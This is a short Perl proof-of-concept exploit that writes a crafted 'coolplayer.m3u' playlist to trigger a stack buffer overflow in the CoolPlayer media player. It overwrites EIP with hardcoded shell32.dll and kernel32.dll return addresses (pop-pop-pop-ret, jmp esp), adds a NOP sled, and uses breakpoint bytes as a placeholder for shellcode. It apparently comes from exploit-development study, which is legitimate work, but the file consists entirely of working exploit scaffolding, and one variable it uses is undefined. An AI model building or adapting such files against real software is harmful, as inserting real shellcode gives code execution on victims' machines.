#!/usr/bin/perl

my $buffsize = 10000; # set consistent buffer size

my $junk = "\x4A" x 260; # simulate unusable address containing junk with 'J'
# my $eip = "\x42" x 4;
my $eip = pack('V',0x7E4293F0); # EIP overwrite with pop-pop-pop-ret from shell32.dll
my $junk2 = "\x4A" x 12; # simulate unusable address containing junk with 'J'
my $usable_address = pack('V',0x7C86467B); # jmp esp kernel32.dll
my $nops = "\x90" x 20;
my $shell = "\xcc" x 500; # simulate shellcode with INT
my $sploit = $jmp.$junk.$eip.$junk2.$usable_address.$nops.$shell; # build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer
my $buffer = $sploit.$fill; # build final buffer

# Write Exploit Buffer to File
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer Size: " . length($buffer) . "\n";
